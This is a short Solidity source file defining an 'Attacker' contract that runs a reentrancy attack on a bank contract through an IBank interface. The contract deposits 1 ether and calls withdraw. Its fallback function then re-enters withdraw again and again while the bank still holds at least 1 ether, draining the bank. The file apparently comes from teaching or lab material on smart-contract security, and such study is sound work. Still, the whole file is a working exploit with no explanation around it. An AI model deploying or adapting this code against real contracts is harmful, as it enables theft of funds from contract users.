// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./IBank.sol";

contract Attacker {
    IBank public bank;

    constructor(address _address) payable {
        bank = IBank(_address);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "insuffient value");

        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
